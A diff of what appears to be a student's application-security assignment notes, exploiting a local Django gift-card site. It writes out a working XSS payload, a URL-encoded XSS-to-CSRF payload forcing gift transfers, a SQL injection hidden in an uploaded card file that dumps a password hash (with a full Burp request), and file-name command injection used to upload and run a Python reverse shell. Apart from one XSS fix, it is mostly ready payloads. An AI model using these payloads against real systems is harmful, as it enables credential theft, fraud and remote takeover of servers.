@@ -1,11 +1,148 @@
+##############################################################
 Xss Attack
+##############################################################
 
 http://127.0.0.1:8000/gift/0?director=%3Cscript%3Ealert(1)%3C/script%3E
 
 FIX - Change {{director|safe}} to {{director}} in all html templates
 
+##############################################################
+END XSS Attack
+##############################################################
 
-Force User to gift Card
-- CSRF attack
-  - Build on XSS vulnerability above 
+##############################################################
+CSRF Attack
+##############################################################
+
+- Force User to Gift Card
+
 http://127.0.0.1:8000/gift/1?director=%3Cscript%3E%0Avar%20xhttp%20%3D%20new%20XMLHttpRequest%28%29%3B%0Axhttp.open%28%22POST%22%2C%20%22%2Fgift%2F3%22%2C%20true%29%3B%0Axhttp.setRequestHeader%28%22Content-type%22%2C%20%22application%2Fx-www-form-urlencoded%22%29%3B%0Axhttp.send%28%22amount%3D2000%26username%3Dtest2%22%29%3B%20%0A%3C%2Fscript%3E
+
+##############################################################
+End CSRF Attack
+##############################################################
+
+##############################################################
+SQL Injection
+##############################################################
+
+Get Salt and Password of User
+
+- Use Gift Card 
+  Line 188 - views.py - use_card_view
+  card_file_data (User Controlled Uploaded file) gets passed to parse_card_data which will parse the json and return
+  Json should have Array of 'records' and first signature needs to have payload for SQL injection 
+  signature = json.loads(card_data)['records'][0]['signature']
+
+  signature then gets past unsanitized to a raw SQL query
+  card_query = Card.objects.raw('select id from LegacySite_card where data = \'%s\'' % signature)
+  so just simple SQL injection but payload has to come in signature of the uploaded file
+
+By creating a file with the following content and then uploading we can dump salt and password hash for user test1
+{
+  "merchant_id": "GiftCardz.com                   ",
+  "customer_id": "DuaneGreenes Store 1451         ",
+  "total_value": 2000,
+  "records": [
+    {
+      "record_type": "amount_change",
+      "amount_added": 2000,
+      "signature": "1' UNION SELECT password from LegacySite_user WHERE username= 'test1"
+    }
+  ]
+}
+
+***********************************
+Full POST request from Burp
+***********************************
+POST /use.html HTTP/1.1
+Host: 127.0.0.1:8000
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: http://127.0.0.1:8000/use.html
+Content-Type: multipart/form-data; boundary=---------------------------36848165132693867485575213236
+Content-Length: 811
+Origin: http://127.0.0.1:8000
+DNT: 1
+Connection: close
+Cookie: sessionid=9i4yetk0vuonksb44n6mxeu3076kcnba
+Upgrade-Insecure-Requests: 1
+
+-----------------------------36848165132693867485575213236
+Content-Disposition: form-data; name="card_data"; filename="giftcard_example.gft"
+Content-Type: application/octet-stream
+
+{
+  "merchant_id": "GiftCardz.com                   ",
+  "customer_id": "DuaneGreenes Store 1451         ",
+  "total_value": 2000,
+  "records": [
+    {
+      "record_type": "amount_change",
+      "amount_added": 2000,
+      "signature": "1' UNION SELECT password from LegacySite_user WHERE username= 'test1"
+    }
+  ]
+}
+
+-----------------------------36848165132693867485575213236
+Content-Disposition: form-data; name="card_supplied"
+
+True
+-----------------------------36848165132693867485575213236
+Content-Disposition: form-data; name="card_fname"
+
+test2
+-----------------------------36848165132693867485575213236--
+***********************************
+END POST REQUEST
+***********************************
+
+##############################################################
+Command Injection
+##############################################################
+
+
+First to discover path
+FileName: test3;pwd|tee tmp_file#
+
+Outputs pwd to tmp_file and then when the 500 error is returned can see full path to current directory; output found in <td>s</td>
+
+Upload reverse_shell.py
+
+-----------------------------243619571321209919733622682574
+Content-Disposition: form-data; name="card_data"; filename="giftcard_examlpe.g.json"
+Content-Type: application/json
+
+
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.0.0.0",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+
+
+-----------------------------243619571321209919733622682574
+Content-Disposition: form-data; name="card_supplied"
+
+True
+-----------------------------243619571321209919733622682574
+Content-Disposition: form-data; name="card_fname"
+
+../home/donald/Desktop/nyu/appsec/nyuappsec/assignment2/reverse
+-----------------------------243619571321209919733622682574--
+
+
+Check for name of file
+
+reverse_8_parser.gftcrd
+
+FileName: test3;ls -la |tee tmp_file# ; output found in <td>s</td>
+
+
+Execute Reverse Shell
+
+Filename: test3;python3 reverse_8_parser.gftcrd & #
+
+
+
+
+
+
